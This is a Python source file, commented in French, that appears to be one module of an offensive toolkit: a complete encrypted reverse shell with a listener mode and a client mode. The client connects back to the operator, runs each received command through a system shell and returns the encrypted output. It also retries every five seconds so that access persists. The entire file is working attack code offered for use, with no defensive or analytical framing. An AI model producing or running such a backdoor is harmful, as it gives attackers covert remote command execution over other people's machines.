# -*- coding: utf-8 -*-
# Module 7 : reverse shell chiffré AES
import socket, subprocess, os, base64, threading
from cryptography.fernet import Fernet

def derive_key(secret):
    # Dérivation clé Fernet depuis un secret
    import hashlib, base64
    h = hashlib.sha256(secret.encode()).digest()
    return base64.urlsafe_b64encode(h)

class ReverseShell:
    def __init__(self, mode, host, port, secret):
        self.mode = mode; self.host = host; self.port = port
        self.f = Fernet(derive_key(secret))

    def server(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((self.host, self.port)); s.listen(1)
        print(f"[+] Écoute sur {self.host}:{self.port}")
        conn, addr = s.accept()
        print(f"[+] Connexion de {addr}")
        while True:
            cmd = input("shell> ")
            if cmd.strip() in ("exit","quit"): break
            conn.send(self.f.encrypt(cmd.encode()) + b"\n")
            data = b""
            while not data.endswith(b"\n"):
                chunk = conn.recv(4096)
                if not chunk: break
                data += chunk
            try:
                print(self.f.decrypt(data.strip()).decode(errors="ignore"))
            except Exception as e:
                print(f"[!] {e}")
        conn.close(); s.close()

    def client(self):
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.host, self.port))
                while True:
                    data = b""
                    while not data.endswith(b"\n"):
                        c = s.recv(4096)
                        if not c: raise Exception("closed")
                        data += c
                    cmd = self.f.decrypt(data.strip()).decode()
                    try:
                        out = subprocess.check_output(cmd, shell=True,
                                                      stderr=subprocess.STDOUT, timeout=30)
                    except Exception as e:
                        out = str(e).encode()
                    s.send(self.f.encrypt(out) + b"\n")
            except Exception:
                time.sleep(5); continue

import time

def run_interactive():
    from toolkit import ok, err, info, section, ask
    section("REVERSE SHELL CHIFFRÉ AES")
    mode = ask("Mode (server/client)", "server")
    host = ask("Hôte", "0.0.0.0" if mode=="server" else "127.0.0.1")
    port = int(ask("Port", "4444"))
    secret = ask("Secret partagé (mot de passe)", "change_me")
    r = ReverseShell(mode, host, port, secret)
    if mode == "server": r.server()
    else: r.client()